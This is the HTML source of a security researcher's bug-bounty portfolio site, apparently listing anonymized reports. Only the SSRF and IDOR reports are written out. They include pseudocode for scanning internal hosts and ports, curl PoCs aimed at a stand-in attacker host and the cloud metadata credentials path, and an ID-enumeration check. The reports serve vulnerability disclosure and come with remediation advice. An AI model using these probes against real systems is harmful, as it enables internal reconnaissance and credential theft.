<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>codenamevenom ‚Äî Security Portfolio</title>
  <meta name="description" content="Technical portfolio of accepted and paid security reports ‚Äî codenamevenom" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
  <style>
    :root{
      --bg:#0b0f12;--card:#0f1620;--muted:#98a0aa;--accent:#ef4444;--glass:rgba(255,255,255,0.03);
      --text:#e6eef6;--light-bg:#f5f5f5;--light-card:#ffffff;--light-text:#222;--light-muted:#666
    }
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial;color:var(--text);background:var(--bg);overflow-x:hidden;display:flex;transition:background .3s,color .3s;min-height:100vh;flex-direction:row}
    body.light{background:var(--light-bg);color:var(--light-text)}

    /* sidebar */
    #sidebar{width:260px;min-height:100vh;background:#0f1620;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-shadow:4px 0 20px rgba(0,0,0,0.6);position:fixed;left:0;top:0;bottom:0;transition:background .3s}
    body.light #sidebar{background:#fff}
    #sidebar h2{margin-top:16px;font-size:20px;letter-spacing:1px;text-transform:uppercase;transition:color .3s, text-shadow .3s}
    #sidebar h2:hover{color:var(--accent);text-shadow:0 0 8px var(--accent)}
    #sidebar p{color:var(--muted);font-size:13px;margin-top:4px;text-align:center}
    #sidebar ul{list-style:none;margin-top:30px;width:100%}
    #sidebar ul li{margin:10px 0}
    #sidebar ul li a{color:inherit;text-decoration:none;display:flex;align-items:center;gap:10px;padding:10px;border-radius:8px;transition:background 0.3s}
    #sidebar ul li a:hover{background:rgba(239,68,68,0.1);color:var(--accent)}

    .sidebar-bottom{margin-top:auto;display:flex;gap:12px;align-items:center}
    .circle-icon{width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#1c2530;color:#aaa;cursor:pointer;transition:all .25s;font-size:18px}
    .circle-icon:hover{color:#fff;background:var(--accent)}
    body.light .circle-icon{background:#ddd;color:#444}

    /* avatar (loop symbol), pulse on load then static, animates only on hover */
    .avatar-wrapper {
      position: relative;
      width: 120px;
      height: 120px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 10px;
    }
    .avatar-circle {
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      background: radial-gradient(circle at 50% 50%, rgba(239,68,68,0.35), transparent 70%);
      border: 3px solid var(--accent);
      box-shadow: 0 0 12px rgba(239,68,68,0.4);
      transition: transform .6s ease, box-shadow .6s ease;
    }
    .avatar-symbol {
      z-index: 2;
      font-size: 44px;
      color: var(--text);
      transition: transform .5s ease, color .5s ease;
      animation: pulse 1.2s ease-out 1; /* pulso iniziale */
    }
    .avatar-wrapper:hover .avatar-circle {
      transform: rotate(360deg) scale(1.06);
      box-shadow: 0 0 26px rgba(239,68,68,0.85);
    }
    .avatar-wrapper:hover .avatar-symbol {
      transform: scale(1.28) rotate(18deg);
      color: var(--accent);
      animation: none; /* evita ripetizione */
    }
    @keyframes pulse {
      0%   { transform: scale(0.9); opacity: 0.7; }
      50%  { transform: scale(1.15); opacity: 1; }
      100% { transform: scale(1); opacity: 1; }
    }


    /* content */
    #content{margin-left:260px;flex:1;padding:30px;max-width:calc(100% - 260px);display:flex;flex-direction:column;min-height:100vh}
    section{display:none;animation:fade .5s ease;flex:1}
    section.active{display:block}
    @keyframes fade{from{opacity:0}to{opacity:1}}

    /* home cards stacked + centered */
    .stack{display:flex;flex-direction:column;align-items:center;gap:60px;margin-top:40px}
    .card{width:70%;background:var(--card);border-radius:14px;padding:20px;box-shadow:0 0 16px rgba(239,68,68,0.08);border:1px solid rgba(255,255,255,0.04);transition:transform 0.28s ease, box-shadow 0.28s ease, background .3s;cursor:pointer}
    .card:hover{transform:translateY(-6px);box-shadow:0 18px 60px rgba(239,68,68,0.14);background:rgba(239,68,68,0.05)}
    body.light .card{background:var(--light-card);color:var(--light-text)}

    /* reports collapsible (minimal, GoDiego-style) */
    .folder{background:var(--card);margin-bottom:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.05)}
    .folder-header{padding:12px;cursor:pointer;font-weight:600;display:flex;align-items:center;gap:8px}
    .folder-header:hover{background:rgba(239,68,68,0.08)}
    .folder-content{display:none;padding:0 18px 12px 18px}
    .folder-content ul{list-style:none;padding-left:0}
    .folder-content li{margin:6px 0;font-size:14px;color:var(--muted)}
    .folder-content a{color:inherit;text-decoration:none}
    .folder-content a:hover{color:var(--accent)}
    body.light .folder{background:var(--light-card)}

    /* about me */
    #about h2{font-family:Georgia,serif;font-size:26px;color:#e6eef6;margin-bottom:10px}
    #about p.intro{font-family:Georgia,serif;font-size:18px;color:#9bb0c8;margin-bottom:20px;min-height:30px}
    #about ul{list-style:disc;margin-left:20px;color:var(--muted)}
    body.light #about h2{color:#222}

    /* contact */
    #contact a{color:inherit;font-size:16px;text-decoration:none}
    #contact a:hover{color:var(--accent)}

    footer{text-align:center;color:var(--muted);font-size:13px;padding:20px;margin-top:auto}
  </style>
</head>
<body>
  <aside id="sidebar">
    <div class="avatar-wrapper" title="codenamevenom">
      <div class="avatar-circle"></div>
      <div class="avatar-symbol">‚ü≥</div>
    </div>
    <h2>CODENAMEVENOM</h2>
    <p>Cybersecurity Engineer ¬∑ Offensive Researcher</p>
    <ul>
      <li><a href="#home" onclick="return showSection('home')"><i class="fa fa-home"></i> Home</a></li>
      <li><a href="#reports" onclick="return showSection('reports')"><i class="fa fa-list"></i> Reports</a></li>
      <li><a href="#about" onclick="return showSection('about')"><i class="fa fa-user"></i> About Me</a></li>
      <li><a href="#contact" onclick="return showSection('contact')"><i class="fa fa-envelope"></i> Contact</a></li>
    </ul>
    <div class="sidebar-bottom">
      <div id="mode-toggle" class="circle-icon" title="Toggle theme"><i class="fa fa-moon"></i></div>
      <a href="mailto:voxlab.services@gmail.com" class="circle-icon" title="Email"><i class="fa fa-envelope"></i></a>
    </div>
  </aside>

  <main id="content">
    <section id="home" class="active">
      <header data-aos="fade-down">
        <h1>Security Portfolio ‚Äî Accepted & Paid Reports</h1>
        <p style="color:var(--muted)">Selection of anonymized reports demonstrating offensive security findings and impact.</p>
      </header>
      <div class="stack">
        <div class="card" data-aos="fade-up" onclick="openReport('ssrf')"><h3>SSRF ‚Äî /api/og/statistic</h3><p>Parameter allowed internal network discovery via SSRF.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('idor1')"><h3>IDOR ‚Äî /api/Log</h3><p>Exposed unauthorized resources through weak access control.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('logic')"><h3>Business Logic ‚Äî Weak Email Validation</h3><p>Allowed automation and abuse of workflow.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('access')"><h3>Improper Access Control ‚Äî /register</h3><p>Registration endpoint abused without authorization.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('xss')"><h3>DOM XSS ‚Äî /user/auth/chooseschema</h3><p>Reflected DOM injection led to XSS.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('idor2')"><h3>IDOR ‚Äî /api/quotes/[UUID]/</h3><p>Predictable UUID exposed other users' data.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('idor3')"><h3>IDOR ‚Äî /v2/apps/[ID]/verification-methods</h3><p>Endpoint leaked verification methods of other users.</p></div>
      </div>
      <footer>¬© 2025 codenamevenom ‚Äî All rights reserved</footer>
    </section>

    <section id="reports">
      <h2>Reports by Category</h2>
      <div class="folder"><div class="folder-header" onclick="toggleFolder(this)"><i class="fa fa-folder"></i> SSRF</div><div class="folder-content"><ul><li><a href="#" onclick="openReport('ssrf')">/api/og/statistic ‚Äî Internal network SSRF</a></li></ul></div></div>
      <div class="folder"><div class="folder-header" onclick="toggleFolder(this)"><i class="fa fa-folder"></i> IDOR</div><div class="folder-content"><ul><li><a href="#" onclick="openReport('idor1')">/api/Log ‚Äî Exposed unauthorized resources</a></li><li><a href="#" onclick="openReport('idor2')">/api/quotes/[UUID]/ ‚Äî Predictable identifier leak</a></li><li><a href="#" onclick="openReport('idor3')">/v2/apps/[ID]/verification-methods ‚Äî Leaked user verification methods</a></li></ul></div></div>
      <div class="folder"><div class="folder-header" onclick="toggleFolder(this)"><i class="fa fa-folder"></i> XSS</div><div class="folder-content"><ul><li><a href="#" onclick="openReport('xss')">/user/auth/chooseschema ‚Äî DOM-based XSS</a></li></ul></div></div>
      <div class="folder"><div class="folder-header" onclick="toggleFolder(this)"><i class="fa fa-folder"></i> Business Logic</div><div class="folder-content"><ul><li><a href="#" onclick="openReport('logic')">Weak Email Validation ‚Äî Workflow abuse</a></li></ul></div></div>
      <div class="folder"><div class="folder-header" onclick="toggleFolder(this)"><i class="fa fa-folder"></i> Access Control</div><div class="folder-content"><ul><li><a href="#" onclick="openReport('access')">/api/auth/local/register ‚Äî Unauthorized registration</a></li></ul></div></div>
      <footer>¬© 2025 codenamevenom ‚Äî All rights reserved</footer>
    </section>

    <section id="about">
      <h2>About Me</h2>
      <p class="intro" id="particleText"></p>
      <h3>Who am I?</h3>
      <ul>
        <li>Offensive Cybersecurity Researcher</li>
        <li>STEM Graduate</li>
        <li>eJPT holder, successfully achieved</li>
        <li>Currently preparing for OSCP</li>
      </ul>
      <footer>¬© 2025 codenamevenom ‚Äî All rights reserved</footer>
    </section>

    <section id="contact">
      <h2>Contact</h2>
      <p><a href="mailto:voxlab.services@gmail.com">voxlab.services@gmail.com</a></p>
      <footer>¬© 2025 codenamevenom ‚Äî All rights reserved</footer>
    </section>

    <section id="report-detail">
  <div style="max-width:900px;margin:0 auto;padding:20px;">
    <h2>SSRF ‚Äî /api/og/statistic</h2>
    <div id="report-body">
      <p><strong>Summary:</strong> A server-side request forgery (SSRF) was discovered in an unauthenticated endpoint responsible for generating Open Graph images. The endpoint allowed arbitrary user-supplied URLs via the <code>image</code> GET parameter, which were fetched server-side and returned as a PNG. Due to the lack of input validation and network egress control, this resulted in a full SSRF primitive with deep internal reconnaissance capabilities.</p>

      <h3>üß† Core Behaviors</h3>
      <ul>
        <li>Arbitrary external/internal URL fetching (unauthenticated)</li>
        <li>Followed HTTP redirects (302, 301)</li>
        <li>Synchronous blocking ‚Äî remote response delays impacted backend response time</li>
        <li>Attacker-controlled content cached under application domain for 1 year</li>
        <li>Access to <code>169.254.169.254</code> (Instance Metadata Service)</li>
        <li><strong>Ability to scan internal IPs and discover open ports</strong></li>
      </ul>

      <h3>üîç Internal Network Discovery</h3>
      <pre><code>for ip in 10.0.0.1 to 10.0.0.255:
  for port in [80,443,8080,8000,5000,3000]:
    image = f"http://{ip}:{port}/favicon.ico"
    response = GET /api/og/statistic?image={image}
    if HTTP 200 or non-empty PNG:
        log live host and port
    elif delay > 5s:
        mark as open|filtered</code></pre>

      <h3>üß® IMDS Access</h3>
      <p>Direct access to the Instance Metadata Service (<code>169.254.169.254</code>) was confirmed:</p>
      <ul>
        <li><code>/latest/meta-data/</code> ‚Üí 200 OK</li>
        <li><code>/latest/meta-data/instance-id</code> ‚Üí valid instance ID</li>
        <li><code>/latest/meta-data/iam/security-credentials/</code> ‚Üí accessible</li>
      </ul>

      <h3>üß™ PoC Examples</h3>
      <pre><code>curl -i 'https://target/api/og/statistic?image=https://attacker.oast.pro/poc.png'</code></pre>
      <pre><code>curl -i 'https://target/api/og/statistic?image=http://169.254.169.254/latest/meta-data/'</code></pre>

      <h3>üéØ Impact</h3>
      <ul>
        <li><strong>Full SSRF</strong> with internal IP scan</li>
        <li><strong>IMDS access</strong> ‚Üí possible credential leak</li>
        <li><strong>Persistent cache</strong> of attacker-controlled resources</li>
        <li><strong>DoS</strong> via delayed responses</li>
      </ul>

      <h3>üõ° Recommended Remediation</h3>
      <ul>
        <li>Denylist/allowlist outbound requests</li>
        <li>Block private IP ranges</li>
        <li>Use async + timeouts</li>
        <li>Enable IMDSv2</li>
      </ul>
    </div>
  </div>
  <footer>¬© 2025 codenamevenom ‚Äî All rights reserved</footer>
</section>

  </main>

  <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
  <script>
    AOS.init({duration:700, once:false, offset:100});

    function showSection(id){
      document.querySelectorAll('main section').forEach(s=>s.classList.remove('active'));
      document.getElementById(id).classList.add('active');
      if(id==='about'){particleEffect();}
      return false;
    }

    function toggleFolder(header){
      const c=header.nextElementSibling;
      c.style.display = c.style.display==='block' ? 'none' : 'block';
    }

    document.getElementById('mode-toggle').onclick=function(){
      document.body.classList.toggle('light');
      this.innerHTML = document.body.classList.contains('light') ? '<i class="fa fa-sun"></i>' : '<i class="fa fa-moon"></i>';
    };

    function particleEffect(){
      const el=document.getElementById('particleText');
      const text="Driven by curiosity, I explore systems to strengthen their security while continuously learning.";
      if(!el) return;
      el.innerHTML='';
      [...text].forEach((ch,i)=>{
        const span=document.createElement('span');
        span.textContent= ch===' ' ? '\u00A0' : ch;
        span.style.opacity=0;
        span.style.display='inline-block';
        span.style.filter='blur(6px)';
        span.style.transform='translateY(6px)';
        span.style.transition=`opacity 0.35s ${i*40}ms, filter 0.35s ${i*40}ms, transform 0.35s ${i*40}ms`;
        el.appendChild(span);
      });
      requestAnimationFrame(()=>{
        el.querySelectorAll('span').forEach(s=>{s.style.opacity=1;s.style.filter='blur(0)';s.style.transform='translateY(0)';});
      });
    }

    function openReport(id){
  // Nascondi tutte le sezioni e mostra report-detail
  document.querySelectorAll('main section').forEach(s => s.classList.remove('active'));
  const reportSection = document.getElementById('report-detail');
  if(!reportSection) return false;
  reportSection.classList.add('active');

  const titleMap = {
    ssrf: "SSRF ‚Äî /api/og/statistic",
    idor1: "IDOR ‚Äî /api/Log",
    logic: "Business Logic ‚Äî Weak Email Validation",
    access: "Improper Access Control ‚Äî /register",
    xss: "DOM XSS ‚Äî /user/auth/chooseschema",
    idor2: "IDOR ‚Äî /api/quotes/[UUID]/",
    idor3: "IDOR ‚Äî /v2/apps/[ID]/verification-methods"
  };

  // elementi di riferimento (una volta sola)
  const titleEl = document.getElementById('report-title') || reportSection.querySelector('h2');
  const bodyEl  = document.getElementById('report-body')  || reportSection.querySelector('div');

  // aggiorna titolo se presente
  if(titleEl) titleEl.textContent = titleMap[id] || "Report";

  // --- comportamento per SSRF: lascia il contenuto statico gi√† inserito ---
  if(id === 'ssrf'){
    // non sovrascrivere il body: il markup SSRF √® gi√† nel DOM
  }
  // --- IDOR full post injection ---
  else if (id === 'idor1') {
    if (bodyEl) {
      bodyEl.innerHTML = `
<div id="post-wrapper">
  <h1>IDOR Exploitation: Breaking Access Control in Action Logging</h1>
  <div class="post-meta text-muted">
    <span>Posted in <em>Offensive Security Research</em> ¬∑ CVSS: <strong>High</strong></span>
  </div>

  <div class="post-content">
    <blockquote>
      <p>
        This article walks through a real-world penetration test finding: an Insecure Direct Object Reference (IDOR) in an action logging endpoint. 
        The case study highlights the importance of thorough mapping during pre-engagement, exploration of business logic paths, and the use of custom Python tooling to validate impact without touching third-party data.
      </p>
    </blockquote>

    <h2>Pre-Engagement: Mapping the Landscape</h2>
    <p>
      Every serious penetration test begins with reconnaissance. Before testing functionality, I invested time in mapping the endpoints exposed by the target system, comparing traffic flows against baseline expectations. 
      This mapping phase was crucial: it revealed patterns in action logging calls, including parameters that appeared sequential and predictable.
    </p>

    <h2>Exploration and Discovery</h2>
    <p>
      During exploration, I identified a logging endpoint responsible for tracking user actions. 
      The request body included an <code>id</code> parameter, which appeared to reference user membership or session identifiers. 
      Surprisingly, the server accepted arbitrary values without checking whether they belonged to the authenticated account.
    </p>

    <h2>Endpoint Behavior</h2>
    <pre><code>
POST /api/log?actionTag=send-invite
Body:
{
  "id": "100245",
  "actionTag": "send-invite",
  "metadata": { "origin": "personalArea" }
}
    </code></pre>

    <p>
      Regardless of ownership, the backend responded with:
    </p>
    <pre><code>
HTTP/2 200 OK
true
    </code></pre>

    <p>
      Non-authenticated requests correctly returned <code>403 Forbidden</code>, but authenticated requests with arbitrary IDs were always accepted.
    </p>

    <h2>Custom Python Tooling</h2>
    <p>
      To test this in a controlled and ethical manner, I developed a custom Python script. 
      The script attached to the browser via the Chrome DevTools Protocol, extracted my own valid JWT token and session cookies, and replayed the request sequence with manipulated IDs. 
      Instead of accessing or modifying third-party data, the script merely checked for <code>true</code> vs <code>false</code> responses. 
      This approach made it possible to systematically confirm the vulnerability while staying within scope and policy.
    </p>

    <pre><code class="language-python">
if r.status_code == 200 and "true" in r.text.lower():
    print(f"[VULNERABLE] id={test_id} accepted")
    </code></pre>

    <h2>Escalation Through Enumeration</h2>
    <p>
      Once the flaw was confirmed, I demonstrated how enumeration could escalate the issue. 
      By iterating over sequential <code>id</code> values, any logged-in user could inject spoofed actions tied to other accounts. 
      This does not expose personal data directly, but it pollutes the system‚Äôs business logic, audit trails, and potential reward mechanisms.
    </p>

    <h2>Business Impact</h2>
    <ul>
      <li>Audit records can be artificially manipulated</li>
      <li>Referral or incentive systems can be fraudulently triggered</li>
      <li>Authorization boundaries are broken at the API level</li>
      <li>Large-scale automated exploitation possible via ID enumeration</li>
    </ul>

    <h2>Why This Matters</h2>
    <p>
      Even without sensitive data leakage, this IDOR is significant. 
      Security is not only about protecting confidentiality but also about ensuring the integrity of business workflows. 
      Allowing unauthorized users to influence system logs or rewards undermines trust in the platform itself.
    </p>

    <h2>Mitigation Recommendations</h2>
    <ul>
      <li>Enforce strict server-side ownership validation for all identifiers</li>
      <li>Reject mismatched <code>id</code> values with <code>403 Forbidden</code></li>
      <li>Tie resource validation directly to authenticated user session IDs</li>
      <li>Apply defense-in-depth: log anomalies and enforce rate limits on action logging</li>
    </ul>

    <h2>Ethical Note</h2>
    <p>
      The testing was performed responsibly using my own account and credentials only. 
      No third-party data was accessed, extracted, or altered. 
      The purpose of this exploration was to highlight the weakness in access control logic and demonstrate safe validation practices.
    </p>
  </div>
</div>
    `;
  }
}
  // --- template placeholder per altri report ---
  else {
    if(bodyEl){
      bodyEl.innerHTML = `
        <div style="max-width:900px;margin:0 auto;padding:20px;">
          <h2>${titleMap[id] || id}</h2>
          <p>Detailed content for <strong>${titleMap[id] || id}</strong> will be added here.</p>
          <p style="color:var(--muted);font-size:13px;margin-top:12px;">Placeholder ‚Äî replace with full report.</p>
        </div>
      `;
    }
  }

  // scroll top
  window.scrollTo({ top: 0, behavior: 'smooth' });
  return false;
}



    // Initialize About text if About is default (not the case now, but safe)
    if(document.getElementById('about').classList.contains('active')){ particleEffect(); }
  </script>
</body>
</html>
